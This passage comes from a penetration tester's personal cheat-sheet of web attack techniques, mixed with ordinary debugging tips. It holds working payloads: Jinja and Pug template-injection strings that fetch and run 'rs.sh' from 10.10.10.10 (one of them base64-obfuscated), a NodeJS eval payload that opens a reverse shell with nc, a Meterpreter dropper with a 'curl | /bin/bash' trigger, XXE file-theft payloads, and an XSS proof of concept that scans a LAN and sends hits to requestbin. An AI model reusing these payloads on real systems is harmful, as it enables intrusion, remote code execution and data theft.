[*] Incoming connection (10.10.10.158,50124)
[*] AUTHENTICATE_MESSAGE (JSON\righettod,JSON)
[-] processRequest (0x73,Missing required parameter 'digestmod'.) <=== ERROR
[*] Handle: Missing required parameter 'digestmod'.
[*] Closing down connection (10.10.10.158,50124)
```

To fix it, I have upgraded **impacket** via the following command:

```shell
$ sudo pip3 install impacket --upgrade
```

## Get information to use for system PrivEsc

Use the following tools.

### Get infos

#### Linux

* [Linux Enumeration](https://github.com/rebootuser/LinEnum)
* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

#### Windows Powershell

* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

### Get applicable exploit

#### Linux

* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

#### Windows Powershell

* [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)

## NoSQL injection hints

### MongoDB

#### Case 1

If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = "var data = db.users.findOne({username:'$USR', password:'$PWD'}); return data;"
$data = $collection->execute($query);
//...
```

Then I can try to detect my capability to influence the query by trying to use one of the following character `' " \ / // ; { } :` in one of the HTTP parameter in order to detect either an error or a change in the response.

#### Case 2

If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

*PHP*

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = array("username" => $USR, "password" => $PWD);
$cursor = $collection->find($query);
//...
```

*NodeJS*

```javascript
let uname = req.body.username;
let pass = req.body.password;
let query = { 
	username: uname,
	password: pass 
}
User.find(query, function (err, user) {/* ... */});
```

Then I can try to detect my capability to influence the query by using [query and projection operators](https://docs.mongodb.com/manual/reference/operator/query/) expression on the HTTP parameter like this:

> It must be adapted to the target platform dealing with the MongoDB! 

*Example for PHP*

```php
// $eq: Matches values that are equal to a specified value.
// $ne: Matches all values that are not equal to a specified value.
// Here check if I can influence the query and check if a user "admin" exists with a password different from "test"
username[$eq]=admin&password[$ne]=test
// $regex: Selects documents where values match a specified regular expression.
// Here check if I can influence the query and check if there is a user with a username 
// starting with the letter "a" with a password different from "yololo"
// The following regex can be used to identify the item with the maximum length (here testing max length to 5): ^.{5}$
username[$regex]=^a.*&password[$ne]=yololo
```

*Same example but for NodeJS where JSON is sent in request body*

```javascript
{"username":{"$eq":"admin"},"password":{"$ne":"test"}}

{"username":{"$regex":"^a.*"},"password":{"$ne":"yololo"}}
```

## SQL injection hints

### Identity query building via string concatenation in code base

Search for the following patterns:

```shell
# Replace the "\+" by the string concatenation character for the target technology
$ grep -Ernwi --color "(SELECT|INSERT|UPDATE|DELETE|ORDER).*?\+.*?" *
```

### PostgreSQL

#### Hints

* Two dollar characters (`$$`) can be used as a quote (`'`).
* Single dollar (`$`) can indicate the beginning of a **tag**. The tag is optional, can contain zero or more characters, and is terminated with a matching dollar (`$`). A closing tag is required to finalize the string.

Example:

```sql
SELECT 'TEST';
SELECT $$TEST$$;
SELECT $TAG$TEST$TAG$;
```

#### System command execution via a SQLI

System command execution can be achieved via a [User Defined Function](https://www.postgresql.org/docs/current/xfunc.html) associated to a custom library (see this [code](../scripts/pg_cmdexec_extension.c) to compile for the target OS and version of PostgreSQL targeted).

For Windows, `system()` vs `ShellExecute()` usage for command execution:

* `system()` can be used on Windows too but it hang until the command executed is finished.
* `ShellExecute()` execute the command and continue without waiting that the command finish.

Follow these steps:

> Daily build of the extension for Linux 64 bits for several versions of PostgreSQL are provided [here](https://github.com/righettod/toolbox-pentest-web/actions?query=workflow%3A%22Build+PostgreSQL+extension%22).

1. Get the version of the DB and OS via the following query:

```sql
SELECT version();
```

2. For Windows install the headers files during the PG installation - For Linux install the following packages:

```shell
# For "postgresql-server-dev-10" install the version matching the version of PostgreSQL targeted
# based on information from the "SELECT version();" query
$ sudo apt install postgresql postgresql-server-dev-10 gcc
```

3. For Windows see [here](https://wiki.postgresql.org/wiki/Building_and_Installing_PostgreSQL_Extension_Modules#Windows_with_Microsoft_Visual_Studio) - For Linux use the following commands to compile the extension:

```shell
$ which pg_config
/usr/bin/pg_config
$ gcc -I$(/usr/bin/pg_config --includedir-server) -shared -fPIC -o pg_cmdexec_extension.so pg_cmdexec_extension.c
$ file pg_cmdexec_extension.so
pg_cmdexec_extension.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

4. Use this [script](../scripts/pg_cmdexec_via_lob.py) to load and use the library via an UDF in order to execute system commands via an SQLI (blind or not).

## Method Resolution Order in Python

Good explanation [here](http://www.srikanthtechnologies.com/blog/python/mro.aspx).

## Python coding tips

See [here](https://book.pythontips.com/en/latest/index.html).

## Open RDP session via XFREERDP

[Documentation](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface).

```shell
$ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /v:[HOST] /u:[LOGIN] /p:[PASSWORD] /size:1180x708
```

## Identify JavaScript libs deployed alongside a web application but not referenced

> This [script](../scripts/identify-hidden-js-libs.sh) can be used to perform the discovery of elements mentioned below.

The following repository is useful to discover JS libraries deployed alongside an app but unused (.i.e unreferenced).

See [here](https://github.com/nice-registry/all-the-package-names).

## Start local SMTP server to allow to receive mail

Run the following command.

Python3:

```python
$ python -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

**Note:** *DebuggingServer* indicate to discard the message after the *smtpd* server receive it.

## Disable TLS warnings in the requests python module

Python3:

```python
import requests
# Disable TLS warning when validation is disabled when requests is used
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Configure proxy to debug request sent using requests and disable validation of the TLS certificate
proxies = { "http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080" }
response = requests.get("https://target.com", verify=False, proxies=proxies)
```

## JavaScript Fetch API tips

[Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API).

[Credentials clause documentation](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials).

### Upload a file

```javascript
//Embeed the file as a blob
var filename = "file.tar.gz";
var fileEncodedInB64 = "...";
//See "https://stackoverflow.com/a/16245768" for the B64 to binary blob handling
var byteCharacters = atob(fileEncodedInB64);
var byteNumbers = new Array(byteCharacters.length);
for (i = 0; i < byteCharacters.length; i++) {
    byteNumbers[i] = byteCharacters.charCodeAt(i);
}
var byteArray = new Uint8Array(byteNumbers);
var fileBlob = new Blob([byteArray], {type: "application/x-compressed-tar"});
//Upload the file
var formData  = new FormData();
formData.append("file", fileBlob, filename);
fetch("/upload ", { credentials: "include", "method": "POST", body: formData})
	.then(response => response.text())
	.then((body) => { /* Do something with the body text content */ });
```

### Post a form

```javascript
var formData  = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "omit", "method": "POST", body: formData})
	//See https://developer.mozilla.org/en-US/docs/Web/API/Body/text
	//See https://developer.mozilla.org/en-US/docs/Web/API/Body/json
	.then(response => response.text()) 
	.then((body) => {  /* Do something with the body text content */ });
```

### Deal with HTTP 30x

```javascript
var formData = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "include", "method": "POST", body: formData })
	.then(response => {
		//If "response.redirected" is true then a HTTP 30x was received
		//See https://developer.mozilla.org/en-US/docs/Web/API/Response/redirected
		if (response.redirected) { /* Do something */ }
	});
```

## Meterpreter shell tips

[MSFVenom cheatsheet documentation](https://book.hacktricks.xyz/shells/shells/msfvenom).

[Meterpreter basics documentation](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

### Generate a meterpreter client

#### Linux x86

```shell
$ msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp  LHOST=10.10.10.10 LPORT=2222 -f elf > shell.bin
$ file shell.bin
```

#### Windows x86

```shell
$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=2222 -f exe > shell.exe
$ file shell.exe
```

### Start listener server

Once in *MSFConsole*:

```shell
use exploit/multi/handler
set PAYLOAD [SAME_THAN_ONE_SPECIFIED_FOR_CLIENT] # Specified in parameter "-p"
set LHOST 10.10.10.10 # Network interface, like "eth0", can be specified instead of host/ip
set LPORT 2222
exploit
```

### Meterpreter client dropper

```bash
#!/bin/bash
# Meterpreter binary encoded in Base64
# via the command "cat meter.bin | base64 -w 0"
m="xxxx"
# Decode and execute it
echo $m | base64 -d > /tmp/meter.bin
chmod +x /tmp/meter.bin
/tmp/meter.bin
```

Trigger execution via the command: `curl http://10.10.10.10/rs.sh | /bin/bash`

### Meterpreter useful commands

See [here](Meterpreter_cheat_sheet.pdf) for more details or commands.

```shell
# Provides information about target host
meterpreter> sysinfo
# Obtain the username responsible for the current process
meterpreter> getuid
# Displays network interfaces information
meterpreter> ipconfig
# Obtain current working directory on Server side
meterpreter> getwd
# Obtain local current working directory
meterpreter> getlwd
# Read the given file
meterpreter> cat <file>
# Upload a file to the target host
meterpreter> upload <src file> <dst file>
# Download a file from the target host
meterpreter> download <src file> <dst file>
```

## SSTI tips

The first step is to identify the syntax for the **Expression** and **Statement** for the targeted template engine in place. This [fuzzing dictionary](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt) can help.

### Python with Jinja

**Statements** and **Expressions** combinations allowing execution of command and bypassing some filters that check for forbiden characters like "_":

```jinja
{# Define the character underscore without writing it statically #}
{% set marker = "%c" % 95 %}

{# Define an entry point object instance to search in the execution context #}
{% set string = "x" %}

{# Build the names of objects without using the underscore explicitly #}
{% set class = marker[0] + marker[0] + "class" + marker[0] + marker[0] %}
{% set mro = marker[0] + marker[0] + "mro" + marker[0] + marker[0] %}
{% set subclasses = marker[0] + marker[0] + "subclasses" + marker[0] + marker[0] %}

{# Access to the MRO of the entry point object instance and then loaded sub classes in the current execution context #}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}

{# Dynamically find the index of the class "subprocess.Popen" in the current execution context #}
{% set size = subclasses_r|length %}
{% set index = -1 %}
{% for i in range(size) %}
	{# value for "class_name" is like "<class 'subprocess.popen'>" #}
	{% set class_name = subclasses_r[loop.index]|string|lower|safe %}
	{# value for class_name_short is like "subprocess.popen" #}
	{% set class_name_short = class_name.split("'")[1] %}
	{# Check current class #}
	{% if class_name_short == "subprocess.popen" and index == -1 %}
		{% set index = loop.index %}
		{% set subclass = subclasses_r[index] %}
		CLASS:
		Index: {{ index }}
		Class: {{subclass|forceescape}}
		{# Value for PIPE was obtained by reading the source code of the class subprocess #}
		{% set pipe = -1 %}
		{# Trigger the execution of the wanted command #}
		{% set p = subclass (["/bin/wget", "10.10.10.10/rs.sh"], stdout=pipe, stderr=pipe) %}
		{# Access to the execution output #}
		EXEC STDOUT:
		{{ p.stdout.read() }}
		EXEC STDERR:
		{{ p.stderr.read() }}
	{% endif %}
{% endfor %}
```

### NodeJS via Express with Pug

Interesting objects to inspect via a template **Expression**:

```javascript
#{this}
#{Object.keys(this)}
#{Object.keys(global)}
#{Object.keys(process)}
```

**Expression** allowing execution of command and bypassing some filters:

```javascript
/*
cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=

Once Base64 decoded is

r=process.mainModule.constructor._load;r("child_process").exec("curl 10.10.10.10/rs.sh | /bin/bash");
*/
=eval(new Buffer("cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=",'base64').toString('ascii'))
```

### NodeJS when a feature use user provided code in the eval() function

**Code** allowing execution of command and bypassing some filters by defining a custom limited execution context. Here `[ExternalObjectReferencePassed]` refer to an object reference passed from the external context to the custom execution context created:

```javascript
(function test(){var p=[ExternalObjectReferencePassed].constructor.constructor('return process')();var require=p.mainModule.require;var cp=require('child_process'); var c='nc 10.10.10.10 9100 -e \\\\x2fbin\\\\x2fbash'; cp.exec(c); return 1;})()
```

## Debug a DotNet web app with DNSpy

Debug instruction:

```csharp
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

Procedure:

1. Using DNSpy: Add the **debug instruction** to the target assembly in the app install directory and save the assembly module.
2. Remove the assembly from DNSpy
3. Restart IIS via `iisreset /noforce` to ensure that the assembly will be copied by the worker in its working folder.
4. Access the application home page in order to instruct IIS to initiate a worker.
5. Using DNSpy: Open the assembly file from the worker working folder.
6. Using DNSpy: Attach to the process *w3wp.exe* (IIS worker process) via *Debug > Attach to Process...* menu.
7. Using DNSpy: Pause (*Break All*) the debugging.
8. Using DNSpy: Open all module via *Debug > Windows > Modules* menu, right-click on a module and click on *Open All Modules*.
9. Using DNSpy: Choose a location and set a breakpoint.
10. Using DNSpy: Click on *Continue* to resume the debugging.
11. Access the application to trigger the breakpoint.

## Debug a Python web app with VSCode

### Step 1

Add the following code in the starting point of the application as first statement before the application start in order to start it allowing to attach a debugger to it:

:information_source: [PTVSD documentation](https://github.com/microsoft/ptvsd)

```python
###### Start the debugger on port 5678
## Dependency: pip install ptvsd
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################
```

Example in a Flask application:

```python
from flask import Flask, request

###### Start the debugger on port 5678
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################

app = Flask(__name__)

@app.route('/', methods=['GET'])
def call():
    print("[+] Call")
    return "OK"
	
app.run(host='0.0.0.0', port=8000)
```

### Step 2

In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

:warning: Adjust the **remoteRoot** attribute to the target deployment absolute folder path!

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python Remote Attach To Debugger",
            "type": "python",
            "request": "attach",
            "connect": {
                "host": "10.10.10.10",
                "port": 5678
            },
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "."
                }
            ]
        }
    ]
}
```

### Step 3

1. Run the application on the server.
2. Launch the debug configuration in VSCode.
3. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

:triangular_flag_on_post: If the error `Only one usage of each socket address (protocol/network address/port) is normally permitted` is raised during the start of the app then change the attach port via the following syntax:

```python
ptvsd.enable_attach(address=("10.10.10.10", 8200), redirect_output=True)
```

## Debug a NodeJS web app with VSCode

### Step 1

Start application in debug mode:

:information_source: [Command line options for the debug mode](https://nodejs.org/en/docs/guides/debugging-getting-started/#command-line-options)

```shell
$ node --inspect=10.10.10.10:9229 app.js
Debugger listening on ws://10.10.10.10:9229/dbc78b68-7d9d-46e6-b501-b3110dd6c04d
For help, see: https://nodejs.org/en/docs/inspector
```

### Step 2

:information_source: [Remote debugging configuration options](https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging)

:information_source: Notes about the `localRoot` and `remoteRoot` configuration options taken from the link above:

> By default, VSCode will stream the debugged source from the remote Node.js folder to the local VSCode and show it in a **read-only** editor.

> You can step through this code, but cannot modify it. If you want VSCode to open the editable source from your workspace instead, you can setup a mapping between the remote and local locations. 

> A `localRoot` and a `remoteRoot` attribute can be used to map paths between a local VSCode project and a (remote) Node.js folder. This works even locally on the same system or across different operating systems. Whenever a code path needs to be converted from the remote Node.js folder to a local VS Code path, the `remoteRoot` path is stripped off the path and replaced by `localRoot`. For the reverse conversion, the `localRoot` path is replaced by the `remoteRoot`.

Use the `"localRoot": "${workspaceFolder}"` option to point local sources to the workspace location.

In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "address": "10.10.10.10",
            "name": "NodeJS Remote Attach To Debugger",
            "port": 9229,
            "request": "attach",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "pwa-node"
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

## Debug a PHP web app with VSCode

### Step 1

:information_source: [XDebug documentation](https://xdebug.org/docs/install) 

:triangular_flag_on_post: In this debug mode, it's XDebug that will connect back to the debug listener started by VSCode when a PHP remote script is called.

:warning: Ensure that the following lines are present into the `php.ini` configuration file used by the server in order to ensure that XDebug is installed/configured:

```ini
; ...
zend_extension = [FULL_PATH_TO_THE_XDEBUG_LIBRARY_SO_OR_DLL_FILE]
; ...
[XDebug]
xdebug.remote_enable = true
xdebug.remote_autostart = true
xdebug.remote_connect_back = true
xdebug.remote_port = 8000
```

### Step 2

:warning: Adjust the `[REMOTE_ROOT]` marker to the target deployment absolute folder path!

:warning: Ensure that the server can connect to the IP/PORT specified in the `php.ini` file as well as the VSCode debug configuration!

1. Install the VSCode extension *[PHP Debug](https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug)*.
2. In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Listen for XDebug incoming connection",
            "type": "php",
            "request": "launch",
            "hostname": "10.10.10.10",
            "port": 8000,
            "log": true,
            "pathMappings": {
                "[REMOTE_ROOT]": "${workspaceRoot}"
              }
        }
    ]
}
``` 

### Step 3

1. Launch the debug configuration in VSCode.
2. Set a breakpoint.
3. Call the remote PHP script via the browser or a HTTP client.
4. If all goes well, the  breakpoint will be triggered.

## XML entities types and XXE payloads

### Internal entities

> Internal entities are locally defined within the DTD.

Format:

```xml
<!ENTITY name "value">
```

Example:

```xml
<!ENTITY xxe "<test>xxe</test>">
```

### External entities

> External entities are defined outside the DTD.

#### Private

> Private external entities (indicated by the **SYSTEM** keyword) are targeted to be used by a defined/restricted group of users.

Format:

```xml
<!ENTITY name SYSTEM "URI">
```

Example:

```xml
<!ENTITY xxe SYSTEM "http://mysite.com/xxe.xml">
```

#### Public

> Public external entities (indicated by the **PUBLIC** keyword) are targeted to be used by everyone (no defined audience).

Format:

```xml
<!ENTITY name PUBLIC "public_id" "URI">
```

Example:

```xml
<!ENTITY xxe PUBLIC "-//W3C//TEXT info//EN" "http://mysite.com/xxe.xml">
```

### Parameter entities

> Parameter entities exist only within a DTD. 

> Note the usage of the `%` character.

Format:

```xml
<!ENTITY % name SYSTEM "URI or VALUE">
```

Example:

```xml
<!ENTITY % parameterEntity 'TEST'>
<!ENTITY xxe 'Payload is %parameterEntity;'>
```

### Unparsed external entities

> XML entity are not required to contain valid XML code but, by default, the XML processor will try to process the referenced data.

> To prevent the XML processor the process the referenced data then the `NDATA` clause must be specified.

Format: Note the specification of the `NDATA TYPE` clause.

```xml
<!-- Private external entity -->
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!-- Public external entity -->
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

### XXE payloads

#### Local file read

```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://[FILE_FULL_PATH]"> ]>
```

#### Remote file read

> Can be used for port or host scan.

```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "https://[DOMAIN:PORT]/[PATH]"> ]>
```

:bulb: For a scanning operation, if external entities are not resolved, external DTD location via the **SYSTEM identifier** can be tried via the following payload and checking of the response time delay for variation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mydtd SYSTEM "https://[DOMAIN:PORT]/[PATH]">
<data />
```

:bulb: Same idea using the **PUBLIC identifier**:

[Write-up about misconfigurations in Java XML Parsers](http://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://[DOMAIN:PORT]/[PATH]">
<data />
```

#### XXE via XInclude

[Documentation about usage](https://portswigger.net/web-security/xxe).

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file://[FILE_FULL_PATH]"/>
</data>
```

#### Retrieve data via error message

> **From Portswigger XXE course:** "An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective *if the application returns the resulting error message within its response*."

[Documentation about usage](https://portswigger.net/web-security/xxe/blind).

```xml
<!ENTITY % file SYSTEM "file://[WANTED_FILE_FULL_PATH]">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error; 
```

#### Exfiltrate XML content

XXE main payload:

```xml
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file://[FILE_FULL_PATH]">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://10.10.10.10/wrapper.dtd">
%xxe;
]>
```

File *wrapper.dtd*:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```

## PHP Type Juggling

[Explanation 1](PHP_type_juggling.pdf)

[Explanation 2](https://www.copterlabs.com/strict-vs-loose-comparisons-in-php/)

[Documentation](http://php.net/manual/en/language.types.string.php#language.types.string.conversion)

[Magic hashes](https://github.com/spaze/hashes)

**String conversion to numbers rules:**

> When a string is evaluated in a numeric context, the resulting value and type are determined as follows.

> If the string does not contain any of the characters `.`, `e`, or `E` and the numeric value fits into integer type limits (as defined by PHP_INT_MAX), the string will be evaluated as an int. In all other cases it will be evaluated as a float.

> The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.

Example:

```php
//PHP 7.3.4 (cli)
//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 0
var_dump('0'==0); //bool(true)
var_dump('0xxxxx'==0);//bool(true)
var_dump('0e123'==0);//bool(true)
var_dump('0eABCD'==0);//bool(true)
var_dump('000e123'==0);//bool(true)
var_dump('000eABCD'==0);//bool(true)
var_dump('000E123'==0);//bool(true)
var_dump('000EABCD'==0);//bool(true)

//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 10
var_dump('010'==10);//bool(true)
var_dump('010xxx'==10);//bool(true)
```

## JavaScript general payloads and tips

### Define a Web Messaging global message listener

[Documentation about Events](https://developer.mozilla.org/en-US/docs/Web/Events).

[Documentation about EventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener).

The following code add a listener that is triggered for any message received from a child (i)frame or a parent window:

```html
<script>
    //"message": A message is received from a child (i)frame or a parent window.
    //Data sent is: parent.postMessage({type: "yolo", mydata: "xxx"}, "*");
    window.addEventListener("message", function(e) {
        console.log(JSON.stringify(e.data));
        console.log("Data received: " + e.data.mydata);
    }, false)
</script> 
```

### Find a target in a LAN via a stored XSS

[Source of the idea](https://twitter.com/PortSwiggerRes/status/1346848979263381506).

```html
<!DOCTYPE html>
<html>
<head>
    <title>POC</title>
</head>
<body>
<!--
This POC is a work to find a use case of the following tips:
    https://twitter.com/PortSwiggerRes/status/1346848979263381506

The use case found is the following:
    You have a XSS Stored vulnerability in a application that have 2 areas: One for external users (ex: customers) and 
    One for internal operators (ex: employees).
    
    The insertion point is located in a feature exposed to external users and the XSS is located in a feature exposed 
    to the internal operators using data from externals users areas.
    
    So you are able to execute the JS code in the browsing context + network context of a internal operator.
    
    The goal is to leverage this opportunity to discover and reach internal application in a blind way due
    to network position.

Hypothesis:
    Assume here that we achieve to identify at least one internal IP address
-->
</body>
    <script>
        //POC: Search for the presence of a ManageEngine product on the network where the internal operator is located 
        //https://github.com/danielmiessler/SecLists/pull/517*/
        
        console.info("Start test at " + new Date());

        const searchedFile = "http://IP_ADDRESS:8090/servlet/GetProductVersion";
        const baseIpPrefix = "192.168.178.";//The IP that we have identified is 192.168.178.38
        const loadMaxDelay = 1000;
        const ifr = document.createElement("iframe");
        let currentHostAddr = 30;//Test range 192.168.178.30-40

        //Function handling the case when connection cannot be established
        //by verifying if the test has moved forward or if it is still on the current tested host
        //because "OnError" event is not triggered when connection cannot be established
        function checkLoading(hostAddressTargeted){
            if(currentHostAddr === hostAddressTargeted){
                moveNext(false);
            }
        }

        //Function handling the progress across the different host IP addresses 
        function moveNext(endpointFound){
            //Verify if the loading succeed for the tested host
            if(endpointFound && ifr.src.endsWith("/servlet/GetProductVersion")){
                let ip = baseIpPrefix + currentHostAddr;
                console.warn("Endpoint found on IP: " + ip);
                //Exfiltrate the info using JS
                fetch("http://requestbin.net/r/1njt54v1?ip=" + ip);
            }
            //Move forward
            currentHostAddr++;
            if(currentHostAddr <= 40){
                //Pass to the next host
                ifr.src = searchedFile.replace("IP_ADDRESS", baseIpPrefix + currentHostAddr);
                //Set loading timeout check
                setTimeout(function(){ checkLoading(currentHostAddr) }, loadMaxDelay);
            }else{
                console.info("Finised test at " + new Date());
            }
        }

        //Configure the Iframe, define event handlers on the it to move the test forward and add it to the DOM
        ifr.style.display = "none";
        ifr.sandbox = "";//To speed-us the loading
        ifr.onload = function() { moveNext(true); }; 
        ifr.onerror = function() { moveNext(false); };//Event not triggered when connection cannot be established
        document.body.appendChild(ifr);

        //Made the first run
        ifr.src = searchedFile.replace("IP_ADDRESS", baseIpPrefix + currentHostAddr);
        setTimeout(function(){ checkLoading(currentHostAddr) }, loadMaxDelay);
    </script>
</html> 
```

Execution example:

![Find_Target_In_Lan_Via_Stored_XSS](Find_Target_In_Lan_Via_Stored_XSS.png)

### JS array methods cheatsheet

[Source of the image](https://twitter.com/rauschma/status/1398668839177568259).

[Code samples](https://gist.github.com/rauschma/6cdeb4af7586aa03baed2f925e0a084b).

![JS array methods cheatsheet](JS_array_methods.jpg)

### XSS via SVG

[Documentation](http://ghostlulz.com/xss-svg/).

[Documentation](https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/).

Payload example:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
		var formData  = new FormData();
		formData.append("xxx", "xxx");
		formData.append("yyy", "yyy");
		fetch("/endpoint", { credentials: "include", "method": "POST", body: formData, headers: new Headers({"X-Requested-With": "XMLHttpRequest"})})
			.then(response => response.text()) 
			.then((body) => { alert("Triggered!") });
   </script>
</svg>
```

## Identify gRPC services via reflection

> Another way is described in this [file](BroBox_write_up.pdf) if reflection is not enabled.

The tool [grpcurl](https://github.com/fullstorydev/grpcurl) will be used for this operation.

```shell
# List available services exposed on host "fc.xlm-box.com:443"
$ grpcurl fc.xlm-box.com:443 list
grpc.reflection.v1alpha.ServerReflection
identity.Auth

# List available methods for the service named "identity.Auth" 
$ grpcurl fc.xlm-box.com:443 list identity.Auth
identity.Auth.GetSalt
identity.Auth.GetUser
identity.Auth.GetUsers

# Get the signature of the method named "identity.Auth.GetUsers"
$ grpcurl fc.xlm-box.com:443 describe identity.Auth.GetUsers
identity.Auth.GetUsers is a method:
rpc GetUsers ( .identity.UsersRequest ) returns ( stream .identity.UserReply );

# Get the structure of the parameter named ".identity.UsersRequest"
$ grpcurl fc.xlm-box.com:443 describe .identity.UsersRequest
identity.UsersRequest is a message:
message UsersRequest {
  int32 limit = 1;
}
```

## UUID explanation and vulnerabilities

> This [script](../scripts/identify-uuids.sh) can be used to extract and analyze all UUIDs in a code base.

See the following PDF documents:
* [UUID explained n°1](UUID_explained1.pdf)
* [UUID explained n°2](UUID_explained2.pdf)

:dash: `grep` useful command lines related to UUID search and analysis:

```shell
# Extract all UUID from a code base excluding test related files
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | sort -u
320e6aaf-b9d6-4e01-b092-075c29519524
a5268b64-a499-4fff-b8b7-83b9de77db06
ed0a336d-5006-449e-92d6-7b7eb2a2a769
c587b464-2c71-43c7-8bd4-309f2f25ba03
9c3e9fef-f20f-41c2-91a1-d1c2ed3c50a7
b306dbf1-f172-414c-996c-2592ba7d8e38
2aae4edc-bc51-436c-af04-76307825aaa2
...

# Extract all UUID from a code base excluding test related files and display the versions of the UUIDs
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | cut -d'-' -f3 | cut -c1 | sort -u
1
4
5
```

## Derivate passwords from a base

> The [RSMangler](https://github.com/digininja/RSMangler) script will be used.

```bash
$ echo "MyPasswordBase" | ./rsmangler.rb --file - --min 1 --max 20 --output /tmp/passlist.txt
